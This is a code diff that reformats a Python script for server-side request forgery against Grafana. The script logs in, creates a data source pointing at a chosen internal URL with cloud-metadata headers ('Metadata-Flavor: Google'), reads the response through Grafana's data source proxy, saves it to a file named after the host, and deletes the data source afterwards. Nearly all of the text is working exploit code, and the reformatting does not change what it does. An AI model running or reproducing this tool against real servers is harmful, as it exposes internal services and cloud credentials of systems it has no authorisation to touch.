@@ -51,9 +51,25 @@ def create_source(sessionid,ssrf_url,ghost):
 
 
 	rawBody = "{\"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"access\":\"proxy\",\"isDefault\":false}"
-	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/new","Connection":"close","x-grafana-org-id":"1","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
-	cookies = {"grafana_session":""+sessionid+""}
-	response = session.post(""+ghost+"/api/datasources", data=rawBody, headers=headers, cookies=cookies,verify=False)
+	headers = {
+		"Origin": f"{ghost}",
+		"Accept": "application/json, text/plain, */*",
+		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
+		"Referer": f"{ghost}/datasources/new",
+		"Connection": "close",
+		"x-grafana-org-id": "1",
+		"content-type": "application/json",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Accept-Encoding": "gzip, deflate",
+	}
+	cookies = {"grafana_session": f"{sessionid}"}
+	response = session.post(
+		f"{ghost}/api/datasources",
+		data=rawBody,
+		headers=headers,
+		cookies=cookies,
+		verify=False,
+	)
 	y = json.loads(response.text)
 	if "Data source with same name already exists" in response.text:
 		print("You will need to manually delete the current source that is named SSRF-TESTING")
@@ -70,9 +86,22 @@ def create_source(sessionid,ssrf_url,ghost):
 
 
 def refresh_source(ghost,sessionid,id):
-	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/6/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
-	cookies = {"grafana_session":""+sessionid+""}
-	response = session.get(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False)
+	headers = {
+		"Accept": "application/json, text/plain, */*",
+		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
+		"Referer": f"{ghost}/datasources/edit/6/",
+		"Connection": "close",
+		"x-grafana-org-id": "1",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Accept-Encoding": "gzip, deflate",
+	}
+	cookies = {"grafana_session": f"{sessionid}"}
+	response = session.get(
+		f"{ghost}/api/datasources/{id}",
+		headers=headers,
+		cookies=cookies,
+		verify=False,
+	)
 	if response.status_code == 200:
 		print("Refreshed Sources")
 	else:
@@ -84,9 +113,25 @@ def refresh_source(ghost,sessionid,id):
 
 def create_ssrf(sessionid,ssrf_url,ghost,id):
 	rawBody = "{\"id\":"+id+",\"orgId\":1,\"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"typeLogoUrl\":\"\",\"access\":\"proxy\",\"url\":\""+ssrf_url+"\",\"password\":\"test\",\"user\":\"test\",\"database\":\"test\",\"basicAuth\":false,\"basicAuthUser\":\"\",\"basicAuthPassword\":\"\",\"withCredentials\":false,\"isDefault\":false,\"jsonData\":{\"tlsSkipVerify\":true,\"httpHeaderName1\":\"Metadata-Flavor\",\"httpHeaderName2\":\"Metadata\",\"httpMethod\":\"GET\"},\"secureJsonData\":{\"httpHeaderValue1\":\"Google\",\"httpHeaderValue2\":\"true\"},\"version\":1,\"readOnly\":false}"
-	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/6/","Connection":"close","x-grafana-org-id":"1","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
-	cookies = {"grafana_session":""+sessionid+""}
-	response = session.put(""+ghost+"/api/datasources/"+id+"", data=rawBody, headers=headers, cookies=cookies,verify=False)
+	headers = {
+		"Origin": f"{ghost}",
+		"Accept": "application/json, text/plain, */*",
+		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
+		"Referer": f"{ghost}/datasources/edit/6/",
+		"Connection": "close",
+		"x-grafana-org-id": "1",
+		"content-type": "application/json",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Accept-Encoding": "gzip, deflate",
+	}
+	cookies = {"grafana_session": f"{sessionid}"}
+	response = session.put(
+		f"{ghost}/api/datasources/{id}",
+		data=rawBody,
+		headers=headers,
+		cookies=cookies,
+		verify=False,
+	)
 	if response.status_code == 200:
 		print("SSRF Source Updated")
 	else:
@@ -98,33 +143,60 @@ def create_ssrf(sessionid,ssrf_url,ghost,id):
 	
 
 def check_ssrf(sessionid,id,ghost,ssrf_url):
-	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/"+id+"/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","x-grafana-nocache":"true"}
-	cookies = {"grafana_session":""+sessionid+""}
-	response = session.get(""+ghost+"/api/datasources/proxy/"+id+"/", headers=headers, cookies=cookies,verify=False)
+	headers = {
+		"Accept": "application/json, text/plain, */*",
+		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
+		"Referer": f"{ghost}/datasources/edit/{id}/",
+		"Connection": "close",
+		"x-grafana-org-id": "1",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Accept-Encoding": "gzip, deflate",
+		"x-grafana-nocache": "true",
+	}
+	cookies = {"grafana_session": f"{sessionid}"}
+	response = session.get(
+		f"{ghost}/api/datasources/proxy/{id}/",
+		headers=headers,
+		cookies=cookies,
+		verify=False,
+	)
 	if response.status_code != 502:
 		print("Status code:   %i" % response.status_code)
 		print("Response body:\n %s" % response.text)
 		gghost = ghost.partition('://')[2]
 		sub_addr = gghost.partition('.')[0]
-		text_file = open(""+sub_addr+".txt", "a")
-		text_file.write("SSRF URL: %s\n" % ssrf_url)
-		text_file.write("Status code:   %i\n" % response.status_code)
-		text_file.write("Response body: %s\n\n\n\n" % response.text)
-		text_file.close()
-		delete_source(sessionid,id,ghost)
+		with open(f"{sub_addr}.txt", "a") as text_file:
+			text_file.write("SSRF URL: %s\n" % ssrf_url)
+			text_file.write("Status code:   %i\n" % response.status_code)
+			text_file.write("Response body: %s\n\n\n\n" % response.text)
 	else:
 		print("Error:")
 		print(response.text)
-		delete_source(sessionid,id,ghost)
+
+	delete_source(sessionid,id,ghost)
 
 
 
 
 def delete_source(sessionid,id,ghost):
 
-	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/3/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
-	cookies = {"grafana_session":""+sessionid+""}
-	response = session.delete(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False)
+	headers = {
+		"Origin": f"{ghost}",
+		"Accept": "application/json, text/plain, */*",
+		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
+		"Referer": f"{ghost}/datasources/edit/3/",
+		"Connection": "close",
+		"x-grafana-org-id": "1",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Accept-Encoding": "gzip, deflate",
+	}
+	cookies = {"grafana_session": f"{sessionid}"}
+	response = session.delete(
+		f"{ghost}/api/datasources/{id}",
+		headers=headers,
+		cookies=cookies,
+		verify=False,
+	)
 	if "Data source deleted" in response.text:
 		print("Deleted Old SSRF Source")
 	else:
@@ -136,16 +208,30 @@ def delete_source(sessionid,id,ghost):
 
 def login(ghost,username,password):
 	rawBody = "{\"user\":\""+username+"\",\"password\":\""+password+"\",\"email\":\"\"}"
-	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/signup","Connection":"close","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+	headers = {
+		"Origin": f"{ghost}",
+		"Accept": "application/json, text/plain, */*",
+		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
+		"Referer": f"{ghost}/signup",
+		"Connection": "close",
+		"content-type": "application/json",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Accept-Encoding": "gzip, deflate",
+	}
 	cookies = {"redirect_to":"%2F"}
-	response = session.post(""+ghost+"/login", data=rawBody, headers=headers, cookies=cookies,verify=False)
+	response = session.post(
+		f"{ghost}/login",
+		data=rawBody,
+		headers=headers,
+		cookies=cookies,
+		verify=False,
+	)
 	if "grafana_session" in response.cookies:
 		return response.cookies["grafana_session"]
 	if "grafana_sess" in response.cookies:
 		return response.cookies["grafana_sess"]
-	else:
-		print("Login Session Cookie not set")
-		sys.exit(0)
+	print("Login Session Cookie not set")
+	sys.exit(0)
 
 
 
